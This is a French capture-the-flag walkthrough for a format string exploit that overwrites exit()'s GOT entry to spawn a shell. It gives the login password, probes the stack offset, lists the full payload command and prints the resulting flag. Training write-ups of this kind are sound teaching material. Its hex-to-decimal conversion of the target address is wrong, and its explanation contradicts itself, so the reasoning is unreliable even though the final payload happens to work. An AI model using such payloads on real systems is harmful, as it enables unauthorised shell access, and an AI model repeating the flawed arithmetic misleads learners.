# Level5 - Walkthrough

## Objectif
Utiliser une format string vulnerability pour overwriter l'adresse de `exit()` dans la GOT (Global Offset Table) et faire exécuter la fonction `o()` à la place, qui lance `/bin/sh`.

---

## Étape 1 : Connexion

```bash
ssh level5@localhost -p 4242
# Mot de passe : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---

## Étape 2 : Reconnaissance

```bash
ls -la
./level5
test
# test
```

Le programme lit une entrée via `fgets()` et l'affiche avec `printf()`.

---

## Étape 3 : Identifier la vulnérabilité

Analyser le binaire dans Ghidra :

```c
void n(void)
{
  char local_20c [520];
  
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);  // ← Format string vulnerability !
  exit(1);
}

void o(void)
{
  system("/bin/sh");
  _exit(1);
}
```

La vulnérabilité : `printf(local_20c)` utilise notre entrée comme format string.

Stratégie : Overwriter l'adresse de `exit()` dans la GOT pour qu'elle pointe vers `o()` à la place.

---

## Étape 4 : Trouver les adresses critiques

### Adresse de `o()`

Dans Ghidra, hover sur `o()` → affiche l'adresse :

```
o() @ 0x080484a4
```

### Adresse de `exit()` dans la GOT

```bash
objdump -R level5 | grep exit
```

Résultat :
```
08049838 R_386_JUMP_SLOT   exit
```

Adresse GOT : `0x08049838`

---

## Étape 5 : Trouver la position du buffer sur la stack

```bash
python -c 'print "AAAA" + " %x" * 10' | ./level5
```

Résultat :
```
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
```

`41414141` (AAAA en hex) apparaît à la **4ème position** → le buffer est à position 4.

---

## Étape 6 : Construction du payload

Pour écrire `0x080484a4` (adresse de `o()`) à `0x08049838` (exit GOT) :

1. Mettre l'adresse de exit GOT : `\x38\x98\x04\x08`
2. Utiliser format string pour écrire :
   - `%Xd` où X = nombre de caractères à imprimer
   - `%4$n` pour écrire à la position 4 (notre buffer)

Calcul :
- `0x080484a4` en décimal = **134513824**
- Caractères déjà affichés = 4 (l'adresse)
- Donc : `%134513820d%4$n` (134513824 - 4 = 134513820)

**MAIS** : Plus simple, on peut faire :

```
[adresse exit GOT] + [%134513824d%4$n]
```

Quand printf s'exécute :
1. Il affiche 4 bytes de l'adresse
2. Puis affiche 134513824 caractères
3. Puis écrit à position 4 (exit GOT) la valeur totale de caractères affichés = 0x080484a4

---

## Étape 7 : Exploitation

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' ; cat) | ./level5
```

Résultat : Un shell `/bin/sh` s'ouvre.

```bash
cat /home/user/level6/.pass
```

---

## Flag
```
d3b7bf1025544a6d95147b7b5b3f36f31f333db3
```

